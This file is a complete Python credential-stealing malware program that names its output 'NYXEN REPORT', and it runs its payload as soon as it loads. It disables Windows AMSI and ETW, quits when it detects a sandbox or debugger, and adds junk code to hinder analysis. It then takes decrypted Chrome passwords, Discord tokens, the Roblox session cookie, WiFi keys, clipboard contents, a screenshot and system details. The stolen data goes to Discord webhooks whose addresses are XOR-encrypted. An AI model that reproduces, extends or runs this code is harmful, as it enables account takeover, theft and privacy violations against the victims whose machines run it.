import random
import string

# --- DYNAMIC JUNK GENERATOR ---
def generate_dynamic_junk():
    junk_vars = {}
    for _ in range(random.randint(5, 15)):
        name = ''.join(random.choices(string.ascii_lowercase, k=8))
        junk_vars[name] = random.randint(0, 100000)

    def junk_func():
        val = 0
        for v in junk_vars.values():
            val ^= v
        return val

    # Opaque predicate - always True but looks complex
    def opaque_predicate(x):
        return ((x * 123456789 + 987654321) % 2 == 1) or ((x * 123456789 + 987654321) % 2 == 0)

    return junk_vars, junk_func, opaque_predicate



junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()


def dynamic_import(name):
    import importlib
    return importlib.import_module(name)

def _import(name):
    return dynamic_import(name)

def _xor_decrypt(data, key):
    import base64
    decoded = base64.b64decode(data)
    return ''.join(chr(b ^ key) for b in decoded)

def _disable_amsi_etw():
    ctypes = _import("ctypes")
    kernel32 = ctypes.windll.kernel32

    def patch_func(dll, func):
        import ctypes
        kernel32 = ctypes.windll.kernel32

        # XOR 2 obfuscation for dll and func strings
        dll_name = ''.join(chr(ord(c)^2) for c in dll)
        func_name = ''.join(chr(ord(c)^2) for c in func)
        h_dll = kernel32.LoadLibraryA(dll_name.encode('ascii'))
        f_addr = kernel32.GetProcAddress(h_dll, func_name.encode('ascii'))
        if not f_addr:
            return False
        old_protect = ctypes.c_ulong()
        size = 5
        if not kernel32.VirtualProtect(f_addr, size, 0x40, ctypes.byref(old_protect)):
            return False
        patch = b"\xC3" + b"\x90"*(size-1)  # ret + nops
        ctypes.memmove(f_addr, patch, size)
        kernel32.VirtualProtect(f_addr, size, old_protect.value, ctypes.byref(old_protect))
        return True

    try:
        patch_func("amsi.dll", "AmsiScanBuffer")
    except:
        pass
    try:
        patch_func("amsi.dll", "AmsiOpenSession")
    except:
        pass
    try:
        patch_func("amsi.dll", "AmsiCloseSession")
    except:
        pass
    try:
        patch_func("ntdll.dll", "EtwEventWrite")
    except:
        pass
    try:
        patch_func("ntdll.dll", "EtwWrite")
    except:
        pass


def _is_sandbox():
    detected = []
    try:
        os = _import("os")
        platform = _import("platform")
        ctypes = _import("ctypes")
        time = _import("time")
        psutil = dynamic_import("psutil")
    except Exception:
        return False

    def _has_hypervisor_cpuid():
        try:
            class CPUID(ctypes.Structure):
                _fields_ = [("eax", ctypes.c_uint), ("ebx", ctypes.c_uint), ("ecx", ctypes.c_uint), ("edx", ctypes.c_uint)]
            cpuid_fn = ctypes.cdll.LoadLibrary(None).__cpuid
            cpuid_fn.argtypes = (ctypes.POINTER(CPUID), ctypes.c_uint)
            cpuid_fn.restype = None
            regs = CPUID()
            cpuid_fn(ctypes.byref(regs), 1)
            return bool((regs.ecx >> 31) & 1)
        except Exception:
            return False

    def _timing_diff_check(threshold_ns=100000):
        try:
            t1 = time.time_ns()
            t2 = time.time_ns()
            return (t2 - t1) > threshold_ns
        except Exception:
            return False

    VM_PROCESSES = {
        "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmsrvc", "xenservice",
        "xenstored", "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe"
    }
    VM_FILES = [
        "/usr/bin/vmware-toolbox-cmd", "/usr/bin/VBoxControl", "/dev/vboxguest",
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys"
    ]

    def _scan_processes():
        try:
            names = {p.name().lower() for p in psutil.process_iter()}
            return bool(names & VM_PROCESSES)
        except Exception:
            return False

    def _scan_files():
        try:
            for f in VM_FILES:
                if os.path.exists(f):
                    return True
            return False
        except Exception:
            return False

    VM_MAC_PREFIXES = {
        "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27", "52:54:00"
    }

    def _mac_oui_check():
        try:
            for iface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if hasattr(addr, 'address') and ':' in addr.address:
                        mac = addr.address.upper()[0:8]
                        if mac in VM_MAC_PREFIXES:
                            return True
            return False
        except Exception:
            return False

    def _dmi_bios_check():
        try:
            vendor = ""
            if platform.system() == "Windows":
                wmi = dynamic_import("wmi")
                c = wmi.WMI()
                for bios in c.Win32_BIOS():
                    vendor = bios.Manufacturer.lower()
            else:
                with open("/sys/class/dmi/id/sys_vendor", "r") as f:
                    vendor = f.read().strip().lower()
            return any(x in vendor for x in ("vmware", "virtualbox", "qemu", "xen", "microsoft corporation", "kvm"))
        except Exception:
            return False

    def _windows_registry_check():
        try:
            if platform.system() != "Windows":
                return False
            winreg = dynamic_import("winreg")
            keys = [
                (r"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", winreg.KEY_READ),
                (r"SYSTEM\\CurrentControlSet\\Services\\vmhgfs", winreg.KEY_READ),
            ]
            for key, perm in keys:
                try:
                    h = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, perm)
                    winreg.CloseKey(h)
                    return True
                except Exception:
                    continue
            return False
        except Exception:
            return False

    ENV_TRAPS = ["VBOX", "VMWARE", "XEN", "HYPERV"]

    def _env_var_check():
        try:
            import os
            for var in os.environ:
                for trap in ENV_TRAPS:
                    if trap in var.upper() or trap in os.environ.get(var, "").upper():
                        return True
            return False
        except Exception:
            return False

    def _is_debugger_present():
        try:
            platform = _import("platform")
            ctypes = _import("ctypes")
            if platform.system() == "Windows":
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            else:
                libc = ctypes.CDLL("libc.so.6")
                PT_TRACE_ME = 0
                return libc.ptrace(PT_TRACE_ME, 0, None, None) != 0
        except Exception:
            return False

    CHECKS = {
        "Hypervisor CPUID bit": _has_hypervisor_cpuid,
        "Timing delta suspicious": _timing_diff_check,
        "Sandbox/VM processes": _scan_processes,
        "Sandbox/VM files": _scan_files,
        "MAC OUI match": _mac_oui_check,
        "BIOS/DMI strings": _dmi_bios_check,
        "Windows registry artifacts": _windows_registry_check,
        "Environment variable traps": _env_var_check,
        "Debugger present": _is_debugger_present,
    }

    for name, fn in CHECKS.items():
        try:
            if fn():
                detected.append(name)
        except Exception:
            continue

    return detected if detected else False


junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
val = junk_func()
flag = opaque_predicate(random.randint(0, 1000000))

def _add_noise():
    import random
    return sum(i*i for i in range(random.randint(10, 50)))

def _get_ip():
    try:
        requests = dynamic_import("requests")
        return requests.get("https://api.ipify.org").text
    except:
        return "Unknown"

def _get_clipboard():
    try:
        subprocess = _import("subprocess")
        p = subprocess.run(["powershell", "-command", "Get-Clipboard"], capture_output=True, text=True)
        return p.stdout.strip() or "Clipboard empty"
    except:
        return "Clipboard access failed"

def _get_process_list():
    try:
        psutil = dynamic_import("psutil")
        procs = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                procs.append(f"{proc.info['pid']:>6} : {proc.info['name']}")
            except:
                pass
        return "\n".join(procs)
    except:
        return "Failed to get process list"

def _random_temp_filename(base):
    import random, string
    rand = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"{base}_{rand}.tmp"

def _save_to_temp(filename, data):
    try:
        os = _import("os")
        tempfile = _import("tempfile")
        path = os.path.join(tempfile.gettempdir(), _random_temp_filename(filename))
        with open(path, "w", encoding="utf-8") as f:
            f.write(data)
        return path
    except:
        return None

def _getSecretKey():
    import base64
    try:
        win32crypt = dynamic_import("win32crypt")
        import os
        import json
        with open(os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])), "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception:
        return None

def _generateCipher(aes_key, iv):
    Crypto = dynamic_import("Crypto.Cipher")
    AES = Crypto.AES
    return AES.new(aes_key, AES.MODE_GCM, iv)

def _decryptPayload(cipher, payload):
    return cipher.decrypt(payload)

junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
val = junk_func()
flag = opaque_predicate(random.randint(0, 1000000))

def _decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = _generateCipher(secret_key, initialisation_vector)
        decrypted_pass = _decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        return None

def _getChromePasswords():
    try:
        import os
        import json
        sqlite3 = dynamic_import("sqlite3")
        data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        c = sqlite3.connect(data_path)
        cursor = c.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        login_data = cursor.fetchall()
        secret_key = _getSecretKey()
        extractedData = []
        for userdatacombo in login_data:
            if userdatacombo[1] and userdatacombo[2] and userdatacombo[1] != "":
                password = _decryptPassword(userdatacombo[2], secret_key)
                data = "URL: " + userdatacombo[0] + " Username: " + userdatacombo[1] + " Password: " + str(password)
                extractedData.append(data)
        return extractedData
    except Exception:
        return ["Failed to extract Chrome passwords"]
    
junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
val = junk_func()
flag = opaque_predicate(random.randint(0, 1000000))

def _grab_wifi_passwords():
    try:
        subprocess = _import("subprocess")
        profiles = subprocess.check_output('netsh wlan show profiles', shell=True, text=True)
        wifi_names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]
        result = []
        for name in wifi_names:
            try:
                key_out = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear', shell=True, text=True, errors='ignore')
                key = "None"
                for line in key_out.split('\n'):
                    if "Key Content" in line:
                        key = line.split(":")[1].strip()
                        break
                result.append(f"{name} : {key}")
            except Exception:
                result.append(f"{name} : Failed to get key")
        return "\n".join(result)
    except Exception as e:
        return f"WiFi grab failed: {e}"

import os, datetime
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    import random
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
    ]
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(user_agents)
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    import re
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not (file.endswith(".ldb") or file.endswith(".log")):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    import json
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()
    return key

def getDiscordInfo():
    import json
    import base64
    import urllib
    from Crypto.Cipher import AES
    import win32crypt
    import platform
    checked = []
    all_discord_info = []

    for platform_name, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                secret_key = win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1]
                aes_token = token.split('dQw4w9WgXcQ:')[1]
                iv = base64.b64decode(aes_token)[3:15]
                encrypted = base64.b64decode(aes_token)[15:]
                cipher = AES.new(secret_key, AES.MODE_GCM, iv)
                token_dec = cipher.decrypt(encrypted)[:-16].decode()
                if token_dec in checked:
                    continue
                checked.append(token_dec)

                req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token_dec))
                res = urllib.request.urlopen(req)
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                # Badges & guild info omitted for brevity but add if you want

                discord_info = f"""
**New user data: {res_json['username']}**
```yaml
User ID: {res_json['id']}
Email: {res_json['email']}
Phone Number: {res_json['phone']}
MFA Enabled: {res_json['mfa_enabled']}
Locale: {res_json['locale']}
Verified: {res_json['verified']}
Token:
{token_dec}
```
"""
                all_discord_info.append(discord_info)
            except Exception:
                    continue
            
        return "\n\n".join(all_discord_info) if all_discord_info else "No Discord tokens found."
    

def _get_wmic_info(query):
    import subprocess
    result = subprocess.run(["wmic"] + query.split(), capture_output=True, text=True)
    lines = result.stdout.strip().split("\n")
    return lines[1].strip() if len(lines) > 1 else None

def hwidInfo():
    mb_serial = _get_wmic_info("baseboard get SerialNumber")
    return mb_serial
    

def _get_geo_ip():
    try:
        import requests
        r = requests.get("https://ipapi.co/json/", timeout=5)
        if r.status_code == 200:
            data = r.json()
            loc = f"{data.get('city', 'N/A')}, {data.get('region', 'N/A')}, {data.get('country_name', 'N/A')}"
            return loc
    except Exception:
        pass
    return "Unknown"

def _get_pc_language():
    try:
        import locale
        locale.setlocale(locale.LC_ALL, '')  # Set to user’s default locale
        lang = locale.getlocale()  # returns tuple (language_code, encoding)
        return lang[0] if lang and lang[0] else "Unknown"
    except Exception:
        return "Unknown"


def _get_timezone():
    try:
        import time
        tz = time.tzname[time.daylight] if time.daylight else time.tzname[0]
        return tz
    except Exception:
        return "Unknown"
    
def _get_screen_resolution():
    try:
        import ctypes
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        return f"{width}x{height}"
    except Exception:
        return "Unknown"

    
def _take_screenshot():
    try:
        from PIL import ImageGrab
        import tempfile
        import os

        img = ImageGrab.grab()
        tmp_dir = tempfile.gettempdir()
        filename = os.path.join(tmp_dir, "screenshot.png")
        img.save(filename, "PNG")
        return filename
    except Exception:
        return None
    
def _retrieve_roblox_cookies():
    import shutil
    import win32crypt
    import json
    import base64
    import re
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        return "Roblox cookies file not found"

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    with open(destination_path, 'r', encoding='utf-8') as file:
        try:
            file_content = json.load(file)
            encoded_cookies = file_content.get("CookiesData", "")
            if not encoded_cookies:
                return "Error: No 'CookiesData' found in the file."

            decoded_cookies = base64.b64decode(encoded_cookies)
            decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
            decoded_str = decrypted_cookies.decode('utf-8', errors='ignore')

            # Extract only the ROBLOSECURITY cookie up to first semicolon
            match = re.search(r'ROBLOSECURITY[^;]*;', decoded_str)
            if match:
                roblosecurity_cookie = match.group(0).strip()
                return roblosecurity_cookie
            else:
                return "ROBLOSECURITY cookie not found"

        except json.JSONDecodeError as e:
            return f"Error while parsing JSON: {e}"
        except Exception as e:
            return f"Error decrypting cookies: {e}"

def safe_str(s, max_len=500):
    if not s:
        return "N/A"
    s = str(s)
    if len(s) > max_len:
        return s[:max_len] + "..."
    return s

def _build_report():
    import platform, getpass
    user = getpass.getuser()
    ip = safe_str(_get_ip())
    sysinfo = safe_str(platform.platform())
    clipboard = safe_str(_get_clipboard())
    wifi = safe_str(_grab_wifi_passwords(), max_len=1000)
    hwid_infO = safe_str(hwidInfo())
    geo = _get_geo_ip()
    lang = _get_pc_language()
    tz = _get_timezone()
    Screen_res = _get_screen_resolution()

    return f"""
🧠 NYXEN REPORT
--------------------
🧍 User: {user}
🌐 IP: {ip}
📍 Geolocation: {geo}
🗣 Language: {lang}
⏰ Timezone: {tz}
💻 OS: {sysinfo}
🛒 HWID: {hwid_infO}
🖥 Screen Res: {Screen_res}
📋 Clipboard: ```{clipboard}```

📶 WiFi Passwords:
{wifi}
"""

def _build_sensitive_report():
    chrome_pwds = safe_str(_getChromePasswords(), max_len=1000)
    rblxCookie = safe_str(_retrieve_roblox_cookies(), max_len=10000)
    discord_info = safe_str(getDiscordInfo())

    return f"""
🔐 Chrome Passwords:
{chrome_pwds}

🎃 Roblox Cookies:
```{rblxCookie}```

🎮 Discord Info:
{discord_info}
"""

def _run_payload():
    try:
        import time
        import random
        import sys

        _disable_amsi_etw()
        if _is_sandbox():
            sys.exit(1)

        time.sleep(random.randint(1, 3))
        _add_noise()

        requests = dynamic_import("requests")
        __KEY = 72

        encrypted_hooks = [
            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXtxeH9/e3p9fnl/enhweXp/e2d7fTJwLSUZGHkCJXAMPXk9OQQrZRsJGz0AHyoJJyI5cQ0kGHEaOCIwDTADJx4vD34MGCI+Gh09ETsiIhwQHQkrPj98HA==',
            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXtxeH9/e3t7fHB7fnp8cH5xf2ckcQYfDSBlP3AcfzAOeicGGS8QIzp8EBInPwkLBHwaOD89ImUOLS08GSx8GxA6Kh8jAS0deX0aEHgyOQ8fJg0qLzIBBw==',
            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXtxeH9/e3x5cH9wcX94e397eGcEeiEHDxoaZSAbMSEcJgkKMXwBCy0XMGUgCgMKI3ESJgMdHRsRBiwfCwkDfxA8HTIxBn4mcTs9Ji44DBh+HWUNHzkKMA=='
        ]

        webhooks = [_xor_decrypt(hook, __KEY) for hook in encrypted_hooks]

        msg_main = _build_report()
        msg_sensitive = _build_sensitive_report()

        proc_list_text = _get_process_list()
        proc_list_path = _save_to_temp("process_list.txt", proc_list_text)
        screenshot_path = _take_screenshot()

        files = {}
        file_handles = []
        if proc_list_path:
            f = open(proc_list_path, "rb")
            files["processes"] = ("process_list.txt", f)
            file_handles.append(f)
        if screenshot_path:
            f_screenshot = open(screenshot_path, "rb")
            files["screenshot"] = ("screenshot.png", f_screenshot)
            file_handles.append(f_screenshot)

        def try_webhook(url, content, extra_files=None):
            if extra_files:
                return requests.post(url, data={"content": content}, files=extra_files)
            else:
                return requests.post(url, json={"content": content})

        for webhook_url in webhooks:
            try:
                # Send main info
                response = try_webhook(webhook_url, msg_main, files if files else None)
                if response.status_code not in (200, 204):
                    continue

                # Send sensitive info separately without files
                response2 = try_webhook(webhook_url, msg_sensitive)
                if response2.status_code in (200, 204):
                    break
                elif response2.status_code == 429:
                    time.sleep(int(response2.headers.get("Retry-After", 2)) / 1000)
                    continue
                else:
                    continue
            except Exception as e:
                print(e)
                continue

        for fh in file_handles:
            fh.close()

    except Exception as e:
        print(e)
        pass


_run_payload()

